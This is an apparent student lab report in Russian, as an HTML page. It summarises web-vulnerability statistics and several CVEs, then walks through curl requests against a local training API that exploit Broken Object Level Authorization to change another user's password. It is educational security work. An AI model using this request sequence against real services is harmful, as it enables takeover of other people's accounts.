@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      line-height: 1.6;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code {
+      background: #f4f4f4;
+      padding: 2px 4px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+    }
+    pre {
+      background: #f4f4f4;
+      padding: 15px;
+      border-radius: 5px;
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote {
+      border-left: 4px solid #ddd;
+      margin: 1em 0;
+      padding-left: 20px;
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h1>Лабораторная работа 2</h1>
+<h2>OWASP Top 10 Web: анализ веб-уязвимостей и симуляция SQL Injection</h2>
+<h2># Часть 1. Анализ статистики веб-уязвимостей</h2>
+<h2>1.1. Использованные источники</h2>
+<p>Для анализа использовались российские и зарубежные источники:</p>
+<ol>
+<li><p>Verizon. 2025 Data Breach Investigations Report.<br><a href="https://www.verizon.com/business/resources/T16f/reports/2025-dbir-data-breach-investigations-report.pdf">https://www.verizon.com/business/resources/T16f/reports/2025-dbir-data-breach-investigations-report.pdf</a></p>
+</li>
+<li><p>Positive Technologies. Attacks on web application users are possible in 98 percent of cases.<br><a href="https://global.ptsecurity.com/en/about/news/positive-technologies-attacks-on-web-application-users-are-possible-in-98-percent-of-cases/">https://global.ptsecurity.com/en/about/news/positive-technologies-attacks-on-web-application-users-are-possible-in-98-percent-of-cases/</a></p>
+</li>
+<li><p>RT-Solar. Уязвимости информационных систем российских компаний.<br><a href="https://rt-solar.ru/analytics/reports/5375/">https://rt-solar.ru/analytics/reports/5375/</a></p>
+</li>
+<li><p>BI.ZONE WAF. SQL-инъекции остаются главным риском среди веб-уязвимостей.<br><a href="https://bi.zone/news/bi-zone-waf-sql-inektsii-ostayutsya-glavnym-riskom-sredi-veb-uyazvimostey/">https://bi.zone/news/bi-zone-waf-sql-inektsii-ostayutsya-glavnym-riskom-sredi-veb-uyazvimostey/</a></p>
+</li>
+<li><p>Edgescan. 2025 Vulnerability Statistics Report.<br><a href="https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf">https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf</a></p>
+</li>
+<li><p>OWASP Top 10:2021 — A03 Injection.<br><a href="https://owasp.org/Top10/2021/A03_2021-Injection/">https://owasp.org/Top10/2021/A03_2021-Injection/</a></p>
+</li>
+<li><p>OWASP API Security Top 10:2023 — API1 Broken Object Level Authorization.<br><a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/">https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/</a></p>
+</li>
+<li><p>OWASP API Security Top 10:2023 — API2 Broken Authentication.<br><a href="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/">https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/</a></p>
+</li>
+<li><p>NVD. CVE-2025-9209 — RestroPress Authentication Bypass.<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-9209">https://nvd.nist.gov/vuln/detail/CVE-2025-9209</a></p>
+</li>
+<li><p>NVD. CVE-2025-12030 — ACF to REST API IDOR.<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-12030">https://nvd.nist.gov/vuln/detail/CVE-2025-12030</a></p>
+</li>
+<li><p>NVD. CVE-2025-14082 — Keycloak Admin REST API Information Disclosure.<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14082">https://nvd.nist.gov/vuln/detail/CVE-2025-14082</a></p>
+</li>
+</ol>
+<hr>
+<h2>1.2. Доля атак через эксплуатацию веб-уязвимостей</h2>
+<p>Оценки различаются в зависимости от методологии исследования. Одни источники считают подтверждённые инциденты и утечки, другие — найденные уязвимости веб-приложений, третьи — события, зафиксированные WAF или пентестами.</p>
+<table>
+<thead>
+<tr>
+<th>Источник</th>
+<th>Scope исследования</th>
+<th>Данные</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Verizon DBIR 2025</td>
+<td>Подтверждённые утечки данных и initial access vectors</td>
+<td>Эксплуатация уязвимостей составила 20% подтверждённых утечек как начальный вектор доступа. Это близко к credential abuse, который составил 22%.</td>
+</tr>
+<tr>
+<td>RT-Solar</td>
+<td>Российские компании, внешний периметр и веб-приложения</td>
+<td>Внешний периметр 91% компаний оказался уязвим к атакам. Хотя бы одна критичная уязвимость была найдена в 46% исследованных веб-приложений.</td>
+</tr>
+<tr>
+<td>Positive Technologies</td>
+<td>Исследованные веб-приложения</td>
+<td>Атаки на пользователей были возможны в 98% исследованных веб-приложений. Утечка чувствительной информации была возможна в 91% случаев.</td>
+</tr>
+<tr>
+<td>BI.ZONE WAF</td>
+<td>Веб-уязвимости high/critical уровня</td>
+<td>Более половины уязвимостей высокого и критического уровня пришлись на SQL-инъекции — 56%.</td>
+</tr>
+<tr>
+<td>Edgescan 2025</td>
+<td>Web Application &amp; API vulnerabilities high/critical severity</td>
+<td>SQL Injection составила 28,28% high/critical application vulnerabilities.</td>
+</tr>
+</tbody></table>
+<p>Вывод: веб-уязвимости являются значимым и устойчивым источником риска для организаций. По Verizon, эксплуатация уязвимостей в целом уже составляет 20% подтверждённых утечек как начальный вектор доступа. По российским данным RT-Solar, внешний периметр 91% компаний содержит уязвимости, успешная эксплуатация которых может привести к проникновению во внутреннюю сеть, компрометации узлов или доступу к чувствительным данным. Для веб-приложений особенно заметны SQL-инъекции, XSS, нарушения контроля доступа, раскрытие чувствительной информации и небезопасная загрузка файлов.</p>
+<hr>
+<h2>1.3. Распределение по конкретным веб-уязвимостям</h2>
+<h3>Данные BI.ZONE WAF</h3>
+<p>По данным BI.ZONE WAF, летом 2025 года среди уязвимостей высокого и критического уровня наиболее заметны:</p>
+<table>
+<thead>
+<tr>
+<th>Тип уязвимости</th>
+<th>Доля / позиция</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SQL Injection</td>
+<td>56% high/critical веб-уязвимостей</td>
+</tr>
+<tr>
+<td>XSS</td>
+<td>Второе место по распространённости</td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>Наблюдается рост</td>
+</tr>
+<tr>
+<td>Code Injection</td>
+<td>Наблюдается рост</td>
+</tr>
+</tbody></table>
+<p>Особенно важно, что SQL-инъекции остаются актуальными, несмотря на то что способы защиты от них давно известны: параметризованные запросы, ORM, фильтрация входных данных и ограничение прав учетных записей БД.</p>
+<h3>Данные Edgescan 2025</h3>
+<p>По данным Edgescan 2025, среди high/critical Web Application &amp; API vulnerabilities распределение выглядит следующим образом:</p>
+<table>
+<thead>
+<tr>
+<th>Тип уязвимости</th>
+<th align="right">Доля</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SQL Injection</td>
+<td align="right">28,28%</td>
+</tr>
+<tr>
+<td>Malicious File Upload</td>
+<td align="right">13,56%</td>
+</tr>
+<tr>
+<td>Stored XSS</td>
+<td align="right">10,80%</td>
+</tr>
+<tr>
+<td>Reflected XSS</td>
+<td align="right">6,21%</td>
+</tr>
+<tr>
+<td>Unauthenticated API</td>
+<td align="right">5,06%</td>
+</tr>
+<tr>
+<td>Brute Forcing Weakness</td>
+<td align="right">4,83%</td>
+</tr>
+<tr>
+<td>IDOR / API</td>
+<td align="right">4,14%</td>
+</tr>
+<tr>
+<td>Error Handling</td>
+<td align="right">3,68%</td>
+</tr>
+<tr>
+<td>Broken Access Control</td>
+<td align="right">3,45%</td>
+</tr>
+<tr>
+<td>Sensitive File Disclosure</td>
+<td align="right">3,45%</td>
+</tr>
+</tbody></table>
+<h3>OWASP Top 10</h3>
+<p>В OWASP Top 10:2021 SQL Injection относится к категории <strong>A03:2021 — Injection</strong>. В эту категорию также входят другие уязвимости, связанные с передачей непроверенных данных в интерпретатор команд или запросов. OWASP указывает среди notable CWE:</p>
+<ul>
+<li>CWE-79: Cross-site Scripting;</li>
+<li>CWE-89: SQL Injection;</li>
+<li>CWE-73: External Control of File Name or Path.</li>
+</ul>
+<p>Таким образом, SQL Injection является частным случаем более широкой категории Injection.</p>
+<hr>
+<h2>1.4. Примеры актуальных уязвимостей из NVD</h2>
+<p>Дополнительно были рассмотрены реальные CVE, связанные с веб-приложениями и API.</p>
+<h3>CVE-2025-9209 — RestroPress: Authentication Bypass через REST API</h3>
+<p>Источник:<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-9209">https://nvd.nist.gov/vuln/detail/CVE-2025-9209</a></p>
+<p>В плагине RestroPress для WordPress версии 3.0.0–3.1.9.2 через endpoint <code>/wp-json/wp/v2/users</code> раскрывались private tokens и API data. Из-за этого неаутентифицированный атакующий мог подделать JWT-токены других пользователей, включая администратора, и войти от их имени.</p>
+<p>Категория OWASP:<br><strong>API2:2023 — Broken Authentication</strong></p>
+<p>Недостаток заключается в том, что REST API возвращал данные, которые нельзя отдавать клиенту: приватные токены пользователя. Получив такой токен, атакующий мог сформировать валидный JWT и авторизоваться как другой пользователь.</p>
+<p>Причина недостатка: небезопасная реализация аутентификации и экспонирование чувствительных данных через API.</p>
+<hr>
+<h3>CVE-2025-12030 — ACF to REST API: IDOR / Broken Object-Level Authorization</h3>
+<p>Источник:<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-12030">https://nvd.nist.gov/vuln/detail/CVE-2025-12030</a></p>
+<p>В плагине ACF to REST API до версии 3.3.4 была уязвимость Insecure Direct Object Reference. В методе <code>update_item_permissions_check()</code> проверялось только общее право <code>edit_posts</code>, но не проверялись объектные права вроде <code>edit_post($id)</code>, <code>edit_user($id)</code> или <code>manage_options</code>.</p>
+<p>Категория OWASP:<br><strong>API1:2023 — Broken Object Level Authorization</strong></p>
+<p>Недостаток заключается в том, что пользователь с низкими правами мог обращаться к endpoint’ам вида <code>/wp-json/acf/v3/{type}/{id}</code> и изменять чужие сущности: посты, пользователей, комментарии, термы и глобальные настройки.</p>
+<p>Причина недостатка: недостаточная проверка авторизации на уровне конкретного объекта. Сервер проверял только общее наличие роли или capability, но не проверял, имеет ли пользователь право менять именно этот объект.</p>
+<hr>
+<h3>CVE-2025-14082 — Keycloak Admin REST API: Information Disclosure</h3>
+<p>Источник:<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14082">https://nvd.nist.gov/vuln/detail/CVE-2025-14082</a></p>
+<p>В Keycloak Admin REST API через endpoint <code>/admin/realms/{realm}/roles</code> было возможно раскрытие чувствительных метаданных ролей из-за insufficient authorization checks. В NVD для уязвимости указан CWE-284 Improper Access Control.</p>
+<p>Категория OWASP:<br><strong>API5:2023 — Broken Function Level Authorization</strong></p>
+<p>Недостаток заключается в том, что даже при ограниченном доступе endpoint административного REST API позволял получить метаданные ролей realm’а, которые не должны были быть доступны пользователю с таким уровнем прав.</p>
+<p>Причина недостатка: некорректная серверная проверка прав для административной функции API.</p>
+<hr>
+<h2>1.5. Вывод по части 1</h2>
+<p>По результатам анализа можно сделать следующие выводы:</p>
+<ol>
+<li>Веб-уязвимости остаются значимым источником риска для организаций.</li>
+<li>По Verizon DBIR 2025, эксплуатация уязвимостей составила 20% подтверждённых утечек как initial access vector.</li>
+<li>По данным RT-Solar, внешний периметр 91% российских компаний оказался уязвим к атакам, а хотя бы одна критичная уязвимость была обнаружена в 46% исследованных веб-приложений.</li>
+<li>SQL Injection остаётся одной из наиболее опасных и распространённых веб-уязвимостей. По BI.ZONE WAF, на SQL-инъекции пришлось 56% high/critical веб-уязвимостей. По Edgescan 2025, SQL Injection составила 28,28% high/critical Web Application &amp; API vulnerabilities.</li>
+<li>Кроме SQL Injection, часто встречаются XSS, Broken Access Control, IDOR, Sensitive File Disclosure, Malicious File Upload и ошибки аутентификации/авторизации.</li>
+<li>Основная причина таких уязвимостей — недостаточная серверная проверка входных данных, отсутствие параметризованных SQL-запросов, слабый контроль доступа и небезопасная работа с чувствительными данными.</li>
+</ol>
+<hr>
+<h1>Часть 2. Практика</h1>
+<p>2.1. Что я решил проверитьПосле запуска приложения я сначала решил просто посмотреть, какие ручки вообще есть и как они работают. По смыслу было понятно, что в приложении есть пользователи, регистрация, логин, просмотр профиля и какие-то операции изменения данных.Я решил проверить уязвимость, связанную с авторизацией: может ли один пользователь получить доступ к данным другого пользователя или изменить их.Гипотеза была такая: сервер может проверять, что токен валидный, но не проверять, имеет ли пользователь право работать именно с тем объектом, который указан в URL.Такая проблема относится к <strong>OWASP API1:2023 — Broken Object Level Authorization</strong>.Проще говоря: если я вошёл как <code>varkes</code>, я не должен иметь возможность менять данные пользователя <code>bebris</code>.---## 2.2. Первичная проверка ручекСначала я проверял запросы через консоль браузера, потому что так было быстрее понять, что вообще принимает приложение.Попробовал зарегистрировать пользователя:</p>
+<pre><code class="language-js">fetch(&#39;/users/v1/register&#39;, {  method: &#39;POST&#39;,  headers: {    &#39;Content-Type&#39;: &#39;application/json&#39;  },  body: JSON.stringify({    username: &#39;testuser&#39;,    password: &#39;123456&#39;,    email: &#39;test@example.com&#39;  })}).then(r =&gt; r.json()).then(console.log).catch(console.error);
+</code></pre>
+<p>Пользователь успешно зарегистрировался, поэтому дальше я попробовал залогиниться:</p>
+<pre><code class="language-js">fetch(&#39;/users/v1/login&#39;, {  method: &#39;POST&#39;,  headers: {    &#39;Content-Type&#39;: &#39;application/json&#39;  },  body: JSON.stringify({    username: &#39;testuser&#39;,    password: &#39;123456&#39;  })}).then(r =&gt; r.json()).then(console.log).catch(console.error);
+</code></pre>
+<p>В ответ сервер вернул токен:</p>
+<pre><code>{  &quot;auth_token&quot;: &quot;JWT_TOKEN&quot;,  &quot;message&quot;: &quot;Successfully logged in.&quot;,  &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>После этого стало понятно, что приложение использует JWT. То есть для дальнейших запросов нужно передавать токен в заголовке:</p>
+<pre><code>Authorization: Bearer &lt;token&gt;
+</code></pre>
+<p>Потом я перешёл на <code>curl</code>, потому что через него удобнее сохранять все запросы и ответы для отчёта.</p>
+<hr>
+<h2>2.3. Создание тестовых пользователей</h2>
+<p>Чтобы нормально проверить доступы, я создал двух пользователей:</p>
+<ul>
+<li><code>varkes</code>;</li>
+<li><code>bebris</code>.</li>
+</ul>
+<p>Идея была простая: зайти под <code>varkes</code>, а потом попробовать получить или изменить данные <code>bebris</code>.</p>
+<p>Сначала задал базовый адрес:</p>
+<pre><code>BASE=&quot;http://localhost:8080&quot;
+</code></pre>
+<p>Зарегистрировал <code>varkes</code>:</p>
+<pre><code>curl -s -X POST &quot;$BASE/users/v1/register&quot; \  -H &quot;Content-Type: application/json&quot; \  -d &#39;{&quot;username&quot;:&quot;varkes&quot;,&quot;password&quot;:&quot;varkes123&quot;,&quot;email&quot;:&quot;varkes@example.com&quot;}&#39;
+</code></pre>
+<p>Потом зарегистрировал <code>bebris</code>:</p>
+<pre><code>curl -s -X POST &quot;$BASE/users/v1/register&quot; \  -H &quot;Content-Type: application/json&quot; \  -d &#39;{&quot;username&quot;:&quot;bebris&quot;,&quot;password&quot;:&quot;bebris123&quot;,&quot;email&quot;:&quot;bebris@example.com&quot;}&#39;
+</code></pre>
+<p>Оба пользователя создались без ошибок.</p>
+<hr>
+<h2>2.4. Логин под varkes</h2>
+<p>Дальше я залогинился под пользователем <code>varkes</code>:</p>
+<pre><code>curl -s -X POST &quot;$BASE/users/v1/login&quot; \  -H &quot;Content-Type: application/json&quot; \  -d &#39;{&quot;username&quot;:&quot;varkes&quot;,&quot;password&quot;:&quot;varkes123&quot;}&#39;
+</code></pre>
+<p>В ответ получил JWT-токен:</p>
+<pre><code>{  &quot;auth_token&quot;: &quot;JWT_TOKEN_varkes&quot;,  &quot;message&quot;: &quot;Successfully logged in.&quot;,  &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>Я сохранил его в переменную:</p>
+<pre><code>TOKEN=&quot;JWT_TOKEN_varkes&quot;
+</code></pre>
+<p>Для начала проверил, что токен вообще рабочий:</p>
+<pre><code>curl -i -s &quot;$BASE/users/v1/varkes&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p>Сервер вернул профиль <code>varkes</code>, значит токен подходит и можно продолжать.</p>
+<hr>
+<h2>2.5. Пробую получить профиль bebris с токеном varkes</h2>
+<p>Следующий шаг — проверить, могу ли я под токеном <code>varkes</code> получить данные пользователя <code>bebris</code>.</p>
+<pre><code>curl -i -s &quot;$BASE/users/v1/bebris&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p>Ответ сервера:</p>
+<pre><code>HTTP/1.0 200 OKContent-Type: application/jsonContent-Length: 47Server: Werkzeug/1.0.1 Python/3.7.12{&quot;username&quot;: &quot;bebris&quot;, &quot;email&quot;: &quot;bebris@example.com&quot;}
+</code></pre>
+<p>Тут уже видно подозрительное поведение: я авторизован как <code>varkes</code>, но спокойно получаю email пользователя <code>bebris</code>.</p>
+<p>Пока это ещё не самая критичная проблема, но это уже намекает, что сервер не очень строго проверяет доступ к конкретному пользователю.</p>
+<hr>
+<h2>2.6. Первая попытка изменить данные bebris</h2>
+<p>После этого я попробовал не просто прочитать данные <code>bebris</code>, а изменить их.</p>
+<p>Сначала попробовал поменять email:</p>
+<pre><code>curl -i -s -X PUT &quot;$BASE/users/v1/bebris/email&quot; \  -H &quot;Content-Type: application/json&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot; \  -d &#39;{&quot;email&quot;:&quot;hacked_bebris@example.com&quot;}&#39;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>HTTP/1.0 401 UNAUTHORIZEDContent-Type: application/jsonContent-Length: 73Server: Werkzeug/1.0.1 Python/3.7.12{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Signature expired. Please log in again.&quot;}
+</code></pre>
+<p>Потом попробовал поменять пароль:</p>
+<pre><code>curl -i -s -X PUT &quot;$BASE/users/v1/bebris/password&quot; \  -H &quot;Content-Type: application/json&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot; \  -d &#39;{&quot;password&quot;:&quot;newbebris123&quot;}&#39;
+</code></pre>
+<p>Ответ был такой же:</p>
+<pre><code>HTTP/1.0 401 UNAUTHORIZEDContent-Type: application/jsonContent-Length: 73Server: Werkzeug/1.0.1 Python/3.7.12{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Signature expired. Please log in again.&quot;}
+</code></pre>
+<p>Ещё проверил удаление пользователя:</p>
+<pre><code>curl -i -s -X DELETE &quot;$BASE/users/v1/bebris&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>HTTP/1.0 401 UNAUTHORIZEDContent-Type: application/jsonContent-Length: 73Server: Werkzeug/1.0.1 Python/3.7.12{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Signature expired. Please log in again.&quot;}
+</code></pre>
+<p>Сначала могло показаться, что доступ закрыт, но по тексту ошибки видно другое: проблема не в правах, а в том, что токен истёк. Поэтому я просто заново залогинился под <code>varkes</code> и повторил проверку быстрее.</p>
+<hr>
+<h2>2.7. Повторный логин под varkes</h2>
+<p>Заново получил токен:</p>
+<pre><code>curl -s -X POST &quot;$BASE/users/v1/login&quot; \  -H &quot;Content-Type: application/json&quot; \  -d &#39;{&quot;username&quot;:&quot;varkes&quot;,&quot;password&quot;:&quot;varkes123&quot;}&#39;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>{  &quot;auth_token&quot;: &quot;JWT_TOKEN_varkes_NEW&quot;,  &quot;message&quot;: &quot;Successfully logged in.&quot;,  &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>Сохранил новый токен:</p>
+<pre><code>TOKEN=&quot;JWT_TOKEN_varkes_NEW&quot;
+</code></pre>
+<hr>
+<h2>2.8. Повторная попытка поменять email bebris</h2>
+<p>С новым токеном снова попробовал поменять email пользователя <code>bebris</code>:</p>
+<pre><code>curl -i -s -X PUT &quot;$BASE/users/v1/bebris/email&quot; \  -H &quot;Content-Type: application/json&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot; \  -d &#39;{&quot;email&quot;:&quot;hacked_bebris@example.com&quot;}&#39;
+</code></pre>
+<p>Ответ сервера:</p>
+<pre><code>HTTP/1.0 204 NO CONTENTContent-Type: application/jsonServer: Werkzeug/1.0.1 Python/3.7.12
+</code></pre>
+<p>Код <code>204 NO CONTENT</code> выглядит так, будто запрос прошёл успешно. Но я решил перепроверить и снова запросил профиль <code>bebris</code>:</p>
+<pre><code>curl -i -s &quot;$BASE/users/v1/bebris&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>HTTP/1.0 200 OKContent-Type: application/jsonContent-Length: 47Server: Werkzeug/1.0.1 Python/3.7.12{&quot;username&quot;: &quot;bebris&quot;, &quot;email&quot;: &quot;bebris@example.com&quot;}
+</code></pre>
+<p>Email не изменился. То есть сервер вернул <code>204</code>, но фактически email остался прежним. Возможно, эта ручка работает некорректно или обновление email не применяется.</p>
+<hr>
+<h2>2.9. Попытка поменять пароль bebris</h2>
+<p>Дальше я проверил более важный сценарий — смену пароля пользователя <code>bebris</code>.</p>
+<p>Запрос отправлялся всё ещё с токеном <code>varkes</code>:</p>
+<pre><code>curl -i -s -X PUT &quot;$BASE/users/v1/bebris/password&quot; \  -H &quot;Content-Type: application/json&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot; \  -d &#39;{&quot;password&quot;:&quot;newbebris123&quot;}&#39;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>HTTP/1.0 204 NO CONTENTContent-Type: application/jsonServer: Werkzeug/1.0.1 Python/3.7.12
+</code></pre>
+<p>Снова пришёл код <code>204</code>. Чтобы понять, реально ли пароль поменялся, я попробовал войти под <code>bebris</code> с новым паролем.</p>
+<hr>
+<h2>2.10. Проверяю, сработала ли смена пароля</h2>
+<p>Пробую войти под <code>bebris</code> с новым паролем <code>newbebris123</code>:</p>
+<pre><code>curl -i -s -X POST &quot;$BASE/users/v1/login&quot; \  -H &quot;Content-Type: application/json&quot; \  -d &#39;{&quot;username&quot;:&quot;bebris&quot;,&quot;password&quot;:&quot;newbebris123&quot;}&#39;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>HTTP/1.0 200 OKContent-Type: application/jsonContent-Length: 221Server: Werkzeug/1.0.1 Python/3.7.12{  &quot;auth_token&quot;: &quot;JWT_TOKEN_bebris&quot;,  &quot;message&quot;: &quot;Successfully logged in.&quot;,  &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>Вход успешный. Значит, пароль действительно поменялся.</p>
+<p>После этого я проверил старый пароль <code>bebris123</code>:</p>
+<pre><code>curl -i -s -X POST &quot;$BASE/users/v1/login&quot; \  -H &quot;Content-Type: application/json&quot; \  -d &#39;{&quot;username&quot;:&quot;bebris&quot;,&quot;password&quot;:&quot;bebris123&quot;}&#39;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>HTTP/1.0 200 OKContent-Type: application/jsonContent-Length: 81Server: Werkzeug/1.0.1 Python/3.7.12{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Password is not correct for the user.&quot; }
+</code></pre>
+<p>Старый пароль больше не подходит. Это подтверждает, что пароль пользователя <code>bebris</code> был изменён.</p>
+<p>Самое важное: запрос на смену пароля был отправлен не от <code>bebris</code>, а от <code>varkes</code>.</p>
+<hr>
+<h2>2.11. Проверка удаления bebris</h2>
+<p>Для полноты я ещё проверил, можно ли удалить пользователя <code>bebris</code> с токеном <code>varkes</code>:</p>
+<pre><code>curl -i -s -X DELETE &quot;$BASE/users/v1/bebris&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>HTTP/1.0 401 UNAUTHORIZEDContent-Type: application/jsonContent-Length: 63Server: Werkzeug/1.0.1 Python/3.7.12{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Only Admins may delete users!&quot;}
+</code></pre>
+<p>Удалить пользователя не получилось. Тут сервер уже проверяет, что удаление доступно только администраторам.</p>
+<p>Получается интересная ситуация: удаление защищено, а смена пароля чужого пользователя — нет.</p>
+<hr>
+<h2>2.12. Сводка по проверкам</h2>
+<table>
+<thead>
+<tr>
+<th>Что проверял</th>
+<th>Под каким пользователем</th>
+<th>К какому пользователю обращался</th>
+<th>Результат</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Получение профиля <code>varkes</code></td>
+<td><code>varkes</code></td>
+<td><code>varkes</code></td>
+<td>Успешно</td>
+</tr>
+<tr>
+<td>Получение профиля <code>bebris</code></td>
+<td><code>varkes</code></td>
+<td><code>bebris</code></td>
+<td>Успешно</td>
+</tr>
+<tr>
+<td>Изменение email <code>bebris</code></td>
+<td><code>varkes</code></td>
+<td><code>bebris</code></td>
+<td>Сервер вернул 204, но email не изменился</td>
+</tr>
+<tr>
+<td>Изменение пароля <code>bebris</code></td>
+<td><code>varkes</code></td>
+<td><code>bebris</code></td>
+<td>Успешно</td>
+</tr>
+<tr>
+<td>Удаление <code>bebris</code></td>
+<td><code>varkes</code></td>
+<td><code>bebris</code></td>
+<td>Не получилось, нужны права администратора</td>
+</tr>
+<tr>
+<td>Вход под <code>bebris</code> со старым паролем</td>
+<td>—</td>
+<td><code>bebris</code></td>
+<td>Неуспешно</td>
+</tr>
+<tr>
+<td>Вход под <code>bebris</code> с новым паролем</td>
+<td>—</td>
+<td><code>bebris</code></td>
+<td>Успешно</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>2.13. Что именно подтвердилось</h2>
+<p>Главный проблемный запрос:</p>
+<pre><code>curl -i -s -X PUT &quot;$BASE/users/v1/bebris/password&quot; \  -H &quot;Content-Type: application/json&quot; \  -H &quot;Authorization: Bearer $TOKEN&quot; \  -d &#39;{&quot;password&quot;:&quot;newbebris123&quot;}&#39;
+</code></pre>
+<p>В этом запросе:</p>
+<ul>
+<li>токен принадлежал пользователю <code>varkes</code>;</li>
+<li>в URL был указан пользователь <code>bebris</code>;</li>
+<li>менялся пароль пользователя <code>bebris</code>.</li>
+</ul>
+<p>Сервер должен был проверить, что <code>varkes</code> не имеет права менять пароль <code>bebris</code>. Но этого не произошло.</p>
+<p>Ожидаемая логика должна быть такой:</p>
+<pre><code>Пользователь из токена: varkesПользователь в URL: bebrisvarkes != bebrisvarkes не администраторЗначит, запрос надо отклонить.
+</code></pre>
+<p>Ожидаемый ответ:</p>
+<pre><code>HTTP/1.1 403 Forbidden
+</code></pre>
+<p>Фактический результат:</p>
+<pre><code>Сервер принял запрос и изменил пароль пользователя bebris.
+</code></pre>
+<hr>
+<h2>2.14. Почему это уязвимость</h2>
+<p>Проблема в том, что сервер проверяет только сам факт авторизации.</p>
+<p>То есть он проверяет:</p>
+<pre><code>Есть ли валидный токен?
+</code></pre>
+<p>Но не проверяет:</p>
+<pre><code>Имеет ли этот пользователь право менять именно этот аккаунт?
+</code></pre>
+<p>Из-за этого любой авторизованный пользователь может обратиться к endpoint’у другого пользователя и выполнить действие, которое должно быть запрещено.</p>
+<p>В моём случае <code>varkes</code> смогла поменять пароль <code>bebris</code>.</p>
+<p>Это и есть <strong>Broken Object Level Authorization</strong>: нет нормальной проверки прав доступа на уровне конкретного объекта.</p>
+<hr>
+<hr>
+<h2>Вывод</h2>
+<p>В ходе проверки я подтвердил уязвимость <strong>OWASP API1:2023 — Broken Object Level Authorization</strong>.</p>
+<p>Сценарий получился такой:</p>
+<ol>
+<li>Я создал пользователей varkes и bebris.</li>
+<li>Залогинился под varkes и получил JWT.</li>
+<li>С токеном varkes обратился к данным bebris.</li>
+<li>Потом с тем же токеном varkes отправил запрос на смену пароля bebris.</li>
+<li>Сервер принял запрос.</li>
+<li>После этого bebris смог войти с новым паролем.</li>
+<li>Старый пароль bebris перестал работать.</li>
+</ol>
+<p>То есть приложение проверяет, что пользователь авторизован, но не проверяет, имеет ли он право менять именно этот аккаунт.</p>
+<p>Основная проблема: отсутствие объектной проверки доступа. Пользователь должен иметь возможность менять только свой аккаунт, а изменение чужих аккаунтов должно быть доступно только администратору.</p>
+
+</body>
+</html>
